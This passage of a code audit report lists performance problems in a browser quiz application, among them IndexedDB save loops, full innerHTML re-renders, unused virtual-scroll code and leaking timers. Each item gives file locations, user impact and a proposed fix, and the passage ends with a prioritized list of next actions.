- **User impact**: Every debounced save tick — even ones triggered by ephemeral state changes that don't touch media — runs the full IDB media save loop. The 500ms debounce coalesces calls but doesn't eliminate the wasted work.
- **Fix**: Track media-mutation separately (e.g. a `_mediaDirty` flag set only by `saveQuestion`/`saveTeam`/`saveCategory`/image-setters) and skip `MediaDB.saveAllMedia()` entirely when not dirty.

### 3. [P0] `renderAdmin` always cascades to full innerHTML rebuilds of categories + teams + stats
- **File**: src/app/16-encryption.js:235-240 (renderAdmin callsites); 602 (renderCategoriesAdmin `el.innerHTML=`); 703 (renderQuestionsAdmin `el.innerHTML=`); 1071 (renderTeamsAdmin `el.innerHTML=`)
- **Issue**: `renderAdmin()` is called from `showView('admin')` (14-admin-panel.js:258), after every IDB restore (11-play-logic.js:504, 509, 517), from `loadState()` completion, and from various mutation sites. Each call unconditionally re-runs `renderStatsGrid()`, `renderCategoriesAdmin()`, and `renderTeamsAdmin()` — all of which do `el.innerHTML = arr.map(...).join('')`. No diffing. No memoization. The question-list render embeds full base64 image data URLs inline (`<img src="${_safeMediaSrc(q.mediaData)}">`) for every image question — multi-MB string parse per render.
- **User impact**: Navigating to admin tab freezes the UI for 50-300ms on media-heavy quizzes. Re-rendering after a single +/-1 score click is visibly janky (see #5).
- **Fix**: Track a per-panel dirty flag (`_catDirty`, `_teamDirty`, `_qDirty`) and only re-render the affected panel. For question images, render `<img>` with a placeholder and lazy-load the data URL via IntersectionObserver (or simply skip the thumbnail when `q.mediaData.length > 50_000`).

### 4. [P0] VirtualList and lazy-tab systems in `38-periodic-cleanup.js` are dead code
- **File**: src/app/38-periodic-cleanup.js:7-118 (VirtualList), 124-155 (lazy tabs), 723-833 (renderQuestionsAdminVirtual + selectCatAdminEnhanced)
- **Issue**: The Phase 4 perf module defines a working virtual scroller (`VirtualList`, threshold 50 items), a lazy-tab renderer (`_phase4_onTabSwitched`), and an enhanced question renderer (`renderQuestionsAdminVirtual`). None of them are wired in. `renderQuestionsAdminVirtual` is attached to `window` but never called by `selectCatAdmin`. `selectCatAdminEnhanced` is attached to `window` but never replaces `selectCatAdmin`. `_phase4_onTabSwitched` is attached to `window` but `switchTab` is never monkey-patched to call it. The activation flag `window._useVirtualQuestions = true` mentioned in the comment is never set anywhere.
- **User impact**: A category with 200 questions renders 200 full DOM nodes (each with media badges, options, action buttons) every time `renderQuestionsAdmin` is called — should be ~10 visible nodes with virtual scrolling. The infrastructure exists but is unused.
- **Fix**: Either delete the dead code (saves ~400 LOC) OR wire it in by replacing `window.selectCatAdmin = selectCatAdminEnhanced` and `window.renderQuestionsAdmin = renderQuestionsAdminVirtual` (with the >50 threshold internal). Recommend wiring in.

### 5. [P0] `adjustScore(±1)` triggers full teams-list rebuild + ticker rebuild + saveState on every click
- **File**: src/app/16-encryption.js:1248 (adjustScore → renderTeamsAdmin → updateTicker); src/app/22-features-v7.js:4549-4561 (updateTicker does another `innerHTML=`)
- **Issue**: Clicking the +1 / −1 / reset buttons on a team card calls `saveState(); renderTeamsAdmin(); updateTicker();`. `renderTeamsAdmin` rebuilds every team card (with images, member lists, action buttons) as a string and re-parses. `updateTicker` does the same for the score ticker. Two full innerHTML rebuilds per click. Plus `initTeamsSortable` is re-initialized and `GestureManager.initLongPress` re-attaches 4 touch listeners per card (no removal).
- **User impact**: Rapid scoring (double-clicking +1, or holding the button) causes visible jank. Each click = 2 layout passes + N touch-listener registrations.
- **Fix**: Patch only the changed team's score display: `document.querySelector('.team-card[data-teamid="'+id+'"] .team-score-display').textContent = t.score`. Skip `renderTeamsAdmin` for pure score updates.

### 6. [P1] `showView` runs 4 scroll-reset passes with `querySelectorAll` on every navigation
- **File**: src/app/14-admin-panel.js:200-225
- **Issue**: Every `showView(name)` does four passes (sync + `requestAnimationFrame` + `setTimeout(100)` + `setTimeout(300)`), each calling `el.querySelectorAll('.teamstats-wrapper,.scoreboard-list,.podium-rest,[style*="overflow"]')` and setting `scrollTop=0` on each match. Also forces a reflow via `void el.offsetWidth` (line 224). The querySelector matches `[style*="overflow"]` — a substring scan over every element's inline style attribute in the entire view.
- **User impact**: Each view switch does 4 forced layouts + 4 DOM scans. Visible as a 50-150ms hesitation on slower mobile devices when navigating.
- **Fix**: Cache the scrollable-container selector list once per view (on first show). Drop passes 3 and 4 (the 100ms/300ms setTimeouts are belt-and-suspenders that rarely add value). Skip the `void el.offsetWidth` reflow unless `viewTransitions` is actually enabled AND the view was previously hidden.

### 7. [P1] `_pushRemoteState` JSON-stringifies the full payload and writes to BOTH localStorage AND sessionStorage on every push
- **File**: src/app/36-windows-templates.js:489-510
- **Issue**: Each push (throttled to 50ms; called on every score change, every view change, every 500ms from `state.timerInterval`, every 500ms from `_remotePingTimer`) calls `_buildRemoteState()` (which iterates all teams, all categories, computes `getPlayableQuestionCount()`, etc.), then `JSON.stringify`'s it, then writes the SAME string to `localStorage.setItem('quiz_audience_state', ...)` AND `sessionStorage.setItem('quiz_audience_state', ...)`. Both stores are synchronous.
- **User impact**: During an active quiz with the audience window open, every 500ms the main thread blocks on `JSON.stringify(payload)` + 2 sync storage writes. With 50 teams × 10 members + 200 questions, the payload can be 50-200 KB → 100-400 KB of sync I/O per tick.
- **Fix**: (a) Use `BroadcastChannel.postMessage` only (already done) and drop the LS/SS mirrors — they were a "fallback for cross-origin audience windows" but `BroadcastChannel` works same-origin which is the only case where LS/SS would work too. (b) If the fallback must stay, only write it when `BroadcastChannel` fails, and debounce the LS/SS write to 1s.

### 8. [P1] `TimerRegistry.register` is referenced 3× but doesn't exist — timers silently leak
- **File**: src/app/07-state-mgmt.js:211 (fun-fact timer), 21-solo-mode.js:81 (solo timer), 30-more-i18n.js:194 (session-duration timer)
- **Issue**: All three call sites use `if(typeof TimerRegistry!=='undefined'&&TimerRegistry.register){TimerRegistry.register('context',handle);}`. But `TimerRegistry` (01-foundation.js:207-263) only exports `setInterval`, `setTimeout`, `clear`, `clearByContext`, `clearAll`, `size`, `list` — there is no `register` method. The `typeof` guard makes the call a silent no-op. The raw `setInterval` handles returned (e.g. `_soloTimerInterval`, `_sessionDurTimer`) are therefore NOT tracked by `TimerRegistry.clearAll()`.
- **User impact**: Solo mode timer and session-duration timer keep running across view changes if the user doesn't explicitly end the solo session. On `beforeunload`, `TimerRegistry.clearAll()` does NOT clear them either (the handles are stored in module-local vars but never registered). Not catastrophic (page is unloading) but contradicts the codebase's stated leak-prevention strategy.
- **Fix**: Either add a `register(context, handle)` method to `TimerRegistry`, or convert these three call sites to use `TimerRegistry.setInterval(fn, ms, context)` directly (which returns a registered id).

### 9. [P1] `TimerRegistry.clearAll` runs only on `beforeunload` — comment claims "view change" cleanup but it's missing
- **File**: src/app/01-foundation.js:265-266
- **Issue**: The comment on line 265 says "Auto-clear registered timers on view change and before unload", but only `beforeunload` is wired. There is no `Store.subscribe('VIEW_CHANGE', ...)` or `showView` hook that calls `TimerRegistry.clearByContext(currentView)` or similar. View-scoped timers (e.g. `'saveState:debounce'`, `'phase4-cleanup'`, `'idb-prune'`, `'storage-check'`, `'smartSave-poll'`, `'perf-save-tracker'`) therefore persist across view changes.
- **User impact**: Long sessions accumulate stale timers in the `Map`. Each timer is small, but the `smartSave-poll` (600ms), `perf-save-tracker` (500ms), and `phase4-cleanup` (5 min) all keep firing their callbacks even after the user has navigated away from the relevant view. Wasted CPU and battery.
- **Fix**: In `showView` (14-admin-panel.js), call `TimerRegistry.clearByContext('view:'+oldViewName)` before switching — and tag view-scoped timers with that context when registering.

### 10. [P1] `42-freeze-fix.js` registers a 30s `setInterval` health check that is never cleaned up
- **File**: src/app/42-freeze-fix.js:172-197
- **Issue**: A raw `setInterval(function(){...}, 30000)` runs forever, checking if the timer display is stuck. It is NOT registered with `TimerRegistry` and NOT cleared on view change. Every 30s it does `document.getElementById('timer-display') || document.querySelector('.timer-display, .timer-number')`, parses `parseInt(timerEl.textContent)`, and computes elapsed time — even when the user is in admin view with no quiz running (early-returns at line 174 mitigate this, but only after `window._currentView !== 'question'` check runs).
- **User impact**: Minor — 30s is infrequent and the early-returns are cheap. But it's an orphan timer inconsistent with the codebase's `TimerRegistry` discipline, and it survives `TimerRegistry.clearAll()` on `beforeunload`.
- **Fix**: Convert to `TimerRegistry.setInterval(fn, 30000, 'freeze-fix-health')` so it's tracked and clearable.

### 11. [P1] `HomeButtonFix` wraps `showView` with `setTimeout(fixHomeButtons, 100)` on every navigation
- **File**: src/app/42-freeze-fix.js:250-257
- **Issue**: `window.showView` is monkey-patched to call `_origShowView.apply(...)` then `setTimeout(fixHomeButtons, 100)`. `fixHomeButtons` runs `document.querySelectorAll('.btn[onclick*="showView(\'intro\')"]')` — a substring-attribute selector scan over the ENTIRE document. This runs on every single view switch (admin → question → scores → admin → …). The `setTimeout` is never cancelled, so rapid navigation can queue multiple overlapping `fixHomeButtons` calls.
- **User impact**: ~5-20ms of DOM scanning per view change. Cumulatively noticeable during rapid navigation. Also re-introduces a delay between view show and "Home" button fix.
- **Fix**: Use event delegation on `document` (one `click` listener that intercepts `[onclick*="showView('intro')"]` clicks and redirects to `goToAdmin()`), or fix the "Home" button onclick at template-build time instead of at runtime.

### 12. [P1] Scroll-position listener in `41-final-enhancements.js` runs `document.querySelector` on every scroll event
- **File**: src/app/41-final-enhancements.js:930-945
- **Issue**: `checkScroll` is attached to `window` (passive) AND to `.admin-content` (passive). On every scroll event it does `var ac = document.querySelector('.admin-content'); var acScroll = ac ? ac.scrollTop : 0;`. The `.admin-content` element never changes identity, but is re-queried on every scroll tick. Mobile scroll events fire at 60-120Hz.
- **User impact**: Constant background CPU during scroll on admin tab. Battery drain on mobile. Not catastrophic but unnecessary.
- **Fix**: Cache `var ac = document.querySelector('.admin-content')` once when the back-to-top button is created; re-query only if `ac` is null or detached.

### 13. [P1] `loadState`'s 8-second timeout for `MediaDB.loadAllMedia` combined with #1 means media often fails to load on first paint
- **File**: src/app/11-play-logic.js:412-416 (8s timeout), 417-523 (loadAllMedia call)
- **Issue**: Because `loadAllMedia` is N sequential IDB transactions (#1), an IDB store with 200+ media keys can take 5-10s on a mid-range Android device. The 8s timeout (lines 412-416) fires, sets `_idbLoadDone=true`, and proceeds — but the `loadAllMedia().then(...)` continuation at line 417 still runs in the background and may overwrite `state.categories`/`state.teams` AFTER `renderAdmin()` has already painted, causing a flash of missing images followed by a sudden re-render.
- **User impact**: Users see question cards without images for several seconds after first load, then images "pop in" later when loadAllMedia finally completes. Some users may never see images if the timeout-then-render path runs and the background load is GC'd.
- **Fix**: Fix #1 first (batched IDB transactions should bring loadAllMedia under 500ms). Also, when the 8s timeout fires, ABORT the in-flight `loadAllMedia` instead of letting it run in the background.

### 14. [P1] `cleanupMemory` calls `saveState()` after trimming — re-enters the expensive save loop
- **File**: src/app/38-periodic-cleanup.js:267-301 (cleanupMemory), line 282 (saveState call)
- **Issue**: Every 5 minutes during an active game, `cleanupMemory` trims `sessionStats.answers` (cap 300 → keep 200), `scoreAudit` (cap 1000 → keep 500), `scoreHistory` (cap 500 → keep 400). If any trimming happened, it calls `saveState()` — which triggers the full `_saveStateNow` path including the JSON fingerprint (#2) and `MediaDB.saveAllMedia()` (#1). The trimming is O(N) but the save is O(N²)-ish in IDB round-trips.
- **User impact**: Every 5 minutes during a quiz, a 500ms-5s save storm runs synchronously (debounced, but still blocks IDB). User may see a brief UI freeze.
- **Fix**: Use `saveStateSync()` only if the trimmed size reduction is significant (e.g. >10%), and skip `MediaDB.saveAllMedia` (the trimmed arrays don't contain media). Better: mark only the trimmed paths dirty and use a targeted LS write.

### 15. [P1] `renderCategoriesAdmin` and `renderTeamsAdmin` call `GestureManager.initLongPress` on every render — 4 fresh touch listeners per card, no removal
- **File**: src/app/16-encryption.js:688-695 (categories), 1188-1195 (teams); src/app/07-state-mgmt.js:419-433 (initLongPress)
- **Issue**: Each render iterates all current `.category-card` / `.team-card` elements and calls `initLongPress(cards, builder)`. `initLongPress` attaches `touchstart`, `touchmove`, `touchend`, `touchcancel` (4 listeners) to EACH element. Because `innerHTML=` destroys the previous DOM, the old listeners are GC'd with the old elements — but during the render, N×4 listener registrations happen synchronously. For 50 categories that's 200 `addEventListener` calls per render.
- **User impact**: Adds 5-30ms per render depending on list size. Not a leak (GC handles old elements) but a per-render cost that scales linearly with list size.
- **Fix**: Use event delegation — one `touchstart`/`touchmove`/`touchend`/`touchcancel` listener on the parent container (e.g. `#categories-list-admin`) that uses `e.target.closest('.category-card')` to find the card. Register once on first render, never again.

---

## Summary of Next Actions (ordered by impact)

1. **P0 #1 (IDB batching)**: Rewrite `MediaDB.saveAllMedia` and `MediaDB.loadAllMedia` to use a single transaction with multiple `put`/`get` requests (or `getAll`). Expected: 10-50× faster saves and loads.
2. **P0 #2 (dirty-check media skip)**: Add `_mediaDirty` flag; skip `MediaDB.saveAllMedia()` when only non-media state changed.
3. **P0 #4 (dead virtual scroll)**: Wire `renderQuestionsAdminVirtual` and `selectCatAdminEnhanced` into the actual `window.renderQuestionsAdmin` / `window.selectCatAdmin` (or delete the dead code).
4. **P0 #3 + #5 (per-panel dirty render)**: Track `_catDirty`/`_teamDirty`/`_qDirty`; `adjustScore` patches only the score DOM text, not full `renderTeamsAdmin`.
5. **P1 #7 (remote state payload)**: Drop the LS/SS mirror writes in `_pushRemoteState`; rely on `BroadcastChannel` only.
6. **P1 #8 + #9 + #10 (timer discipline)**: Either add `TimerRegistry.register` or convert all 3 silent-failure sites; wire `clearByContext` into `showView`; register the freeze-fix health check.
7. **P1 #6 + #11 + #12 (view-switch cost)**: Cache scrollable containers in `showView`; replace `HomeButtonFix` runtime scan with event delegation; cache `.admin-content` in scroll listener.
8. **P1 #13 (loadState timeout)**: After fixing #1, abort the in-flight `loadAllMedia` on timeout instead of letting it race with `renderAdmin`.
9. **P1 #14 (cleanup save)**: Make `cleanupMemory` use targeted LS writes, not full `saveState()`.
10. **P1 #15 (touch-listener delegation)**: Convert `GestureManager.initLongPress` to event delegation on the parent container.

